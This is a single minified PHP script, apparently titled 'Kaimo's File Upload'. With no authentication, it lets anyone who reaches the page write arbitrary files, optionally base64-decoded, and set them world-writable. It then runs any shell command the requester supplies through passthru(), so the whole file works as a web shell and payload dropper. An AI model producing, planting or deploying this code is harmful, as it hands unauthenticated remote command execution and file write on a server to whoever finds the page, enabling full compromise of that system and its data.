<?php function a($a){return!empty(`which $a`);}function b($b){echo $b."<br>";}function c($a){chmod($a,0777);}function d($a,$b){passthru(sprintf($a,$b,$b,$b,$b));}$a=function_exists('base64_decode');ini_set('upload_max_filesize',0);ini_set('post_max_size',0);$b=ini_get('upload_max_filesize');$c=($b!==false?($b==0?'Unlimited':$b):'Unknown');$d=ini_get('post_max_size');$e=($d===false?'Unknown':($d==0?'Unlimited':$d));$f=true;if(!ini_get('file_uploads')&&ini_set('file_uploads','On')===false){b("WARNING: Failed to enable file_uploads. Files cannot be uploaded. Use POST");$f=false;}if(array_key_exists('g',$_GET)||!$f){$g="<a href='?'>File Upload</a>";$h="<label for='f'>File data</label><textarea name='f' id='f' style='width:100%;height:27vh;'></textarea><br>";}else{$g="<a href='?g'>Upload via POST</a>";$h="<label for='a'>File</label><br><input type='file' id='a' name='a'><br>";}foreach(['tar'=>['tar','tar -xf %s'],'rar'=>['unrar','unrar x %s'],'tar.7z'=>[['tar','7z'],'7z x -so %s | tar xf -'],'7z'=>['7z','7z x %s'],'tar.bz2'=>['tar','tar -xjf %s'],'tar.gz'=>['tar','tar -xzf %s']]as $i=>$j){$k=true;if(is_array($j[0])){foreach($j[0]as $l){if(!a($l)){$k=!$k;break;}}}else{if(!a($j[0])){$k=!$k;}}$m.="<button type='button' onclick=\"z('".$j[1]."');\" ".($k?'':'disabled').">Extract $i".($k?'':' - UNAVAILABLE')."</button>";}echo"<html><head><title>Kaimo's File Upload</title><script type='text/javascript'>function z(a){document.getElementById('e').value = a;}</script><style type='text/css'>label {font-weight: 600;margin-top: 30px;display:inline-block;} input[type='text'], input[type='submit'] {width: 100%;}</style></head><body>$g<hr>Max Upload Size: $c<br>Max Post Size: $e<hr><form method='post' enctype='multipart/form-data'>$h<input id='d' type='checkbox' name='d'".($a?'':' disabled')."><label for='d'>Base 64 decode after uploading".($a?'':'- UNAVAILABLE')."</label><br><input type='checkbox' name='c' id='c'><label for='c' style='margin-top:0;'>Overwrite file</label><br><label for='e'>Command to execute after uploading and base64 decode. %s for filename.</label><br><input type='text' id='e' name='e' placeholder='e.g. tar -xf %s'><fieldset><legend>Shortcut Commands:</legend>$m</fieldset><label for='b'>Filename</label><small> (required if uploading via POST)</small><br><input type='text' id='b' name='b'><br><br><input type='submit' value='Upload'></form></body></html>";if($_FILES['a']){$n=strlen($_POST['b'])>0?$_POST['b']:$_FILES['a']['name'];$o=$_FILES['a']['tmp_name'];if(file_exists($n)&&!$_POST['c']){b("ERROR: File ".$n." already exists, aborting");die();}if(!is_uploaded_file($o)){b("ERROR: Failed to upload. Did your size exceed the limits?");die();}if($_POST['d']&&$a){$p=file_get_contents($o);if($p===false){b("ERROR: Failed to read temp file ".$o.", I/O error?");die();}$p=base64_decode($p);if($p===false){b("ERROR: Failed to base64-decode data. Invalid format?");die();}$q=fopen($n,'w');if(!$q){b("ERROR: Failed to ready ".$n." for writing. Insufficient permissions?");die();}if(fwrite($q,$p)===false){b("ERROR: Failed to write file data. I/O error?");die();}fclose($q);}else{if(move_uploaded_file($o,$n)===false){b("ERROR: Failed to move file from ".$o);die();}}c($n);b("File successfully uploaded to ".$n);if(!empty($_POST['e'])){d($_POST['e'],$n);}}if(array_key_exists('f',$_POST)){if($_POST['f']===''){b("No post data received. Did you exceed the post size limit?");}else{$p=$_POST['f'];if($_POST['d']){if(!$a){b("ERROR: This server cannot decode base64");die();}$p=base64_decode($p);if($p===false){b("ERROR: Failed to base64 decode data. Out of format?");die();}}if($_POST['b']===''){b("WARNING: Filename omitted, defaulting to 'output'");$n='output';}else{$n=$_POST['b'];}if(file_exists($n)&&!$_POST['c']){b("ERROR: File already exists, aborting");die();}$q=fopen($n,'w');if(!$q){b("ERROR: Failed to get handle on file. Insufficient file permissions?");die();}if(fwrite($q,$p)===false){b("ERROR: Failed to write to file. I/O error?");die();}fclose($q);c($n);if(!empty($_POST['e'])){d($_POST['e'],$n);}b("File ".$n." has been created");}} ?>